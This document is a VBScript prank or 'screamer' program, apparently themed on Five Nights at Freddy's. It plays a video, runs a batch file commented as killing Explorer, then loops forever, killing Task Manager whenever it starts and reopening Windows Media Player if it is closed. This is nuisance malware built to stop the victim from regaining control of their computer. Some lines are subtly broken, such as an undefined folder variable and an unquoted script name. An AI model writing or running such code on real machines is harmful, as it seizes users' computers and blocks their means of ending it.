dim oPlayer, scriptDir, objFSO, mp3FileName, mp3FilePath, wShell, batFileName, batFilePath, wmi

'define objects
set oPlayer = CreateObject("WMPlayer.OCX")
set wShell = CreateObject("WScript.Shell") 
set objFSO = CreateObject("Scripting.FileSystemObject")

'set media name
mp3Name = "fnaf.mp4"

'set function bat
batName = "exit.bat"
otherBatName = "exit2.bat"
msgboxVBS = "msgbox.vbs"


'connect to WMI
set wmi = GetObject("winmgmts:\\.\root\cimv2")

'find file paths for portability
Dir = objFSO.GetParentFolderName(WScript.ScriptFullName)
mp3 = objFSO.BuildPath(Dir, mp3Name)
bat = objFSO.BuildPath(Dir, batName)
msgboxp = objFSO.BuildPath(Dir, msgboxVBS)
otherBat = objFSO.BuildPath(tDir, otherBatName)

'set oplayer url
oPlayer.URL = mp3

'open wmplayer and video url 
oPlayer.openPlayer(oPlayer.URL)

'wait for wmplayer to fully start then display msgbox

wShell.run msgboxp

'kill explorer
wShell.run bat

do
    found=false
    wmpfound=false
    setupwmp=false

    'ask wmi for running taskmgr constantly and change found to true if wmi returns that its running
    for each p in wmi.execquery("Select * from Win32_Process Where Name='taskmgr.exe'")
        found=true
        
    next

    if found then

        'kill taskmgr and display msgbox
        wShell.run otherBat
        wShell.run msgboxp

    end if

    for each p in wmi.execquery("Select * from Win32_Process Where Name='setup_wm.exe'")
        setupwmp=true
    next

    if setupwmp then

        wShell.run setup.vbs
        wmpfound=true

    end if

    'new query to search for closed wmplayer
    for each p in wmi.execquery("Select * from Win32_Process Where Name='wmplayer.exe'")
        wmpfound=true
    next

    if wmpfound=false then

        'if wmplayer isnt running then open it again and run the msgbox
        oPlayer.openPlayer(oPlayer.URL)
        wShell.run msgboxp

    end if
loop

    


